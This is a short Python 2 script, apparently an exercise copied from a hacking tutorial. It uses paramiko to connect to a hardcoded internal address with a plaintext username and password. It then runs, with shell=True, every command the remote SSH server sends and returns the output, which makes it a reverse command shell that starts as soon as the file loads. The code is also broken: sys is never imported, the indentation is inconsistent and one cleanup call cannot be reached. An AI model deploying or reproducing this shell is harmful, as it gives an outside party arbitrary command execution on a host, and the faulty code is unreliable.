#!/usr/bin/env python
import threading, paramiko, subprocess

usage = "test this first"

def banner():  #Provide description of program
    print "[***] SSH with Paramiko p27[***]"
    print ""
    print "Enter Syntax or information for how program works"

def ssh_command(ip, user, passwd, command):
	client = paramiko.SSHClient()							#client.load_host_keys('/home/justin/.ssh/known_hosts')
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip, username= user, password= passwd)
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.exec_command(command)
		print ssh_session.recv(1024) 					#read banner
		while True:
			command = ssh_session.recv(1024)			#get the command from the SSH server
			try:
				cmd_output = subprocess.check_output(command, shell=True)
				ssh_session.send(cmd_output)
			except Exception,e:
				ssh_session.send(str(e))
		client.close()
	return
ssh_command('192.168.1.59', 'justin', 'lovesthepython','ClientConnected')

def main():
	banner()
	if not len(sys.argv[1:]):
        print usage

if __name__ == '__main__':
	main()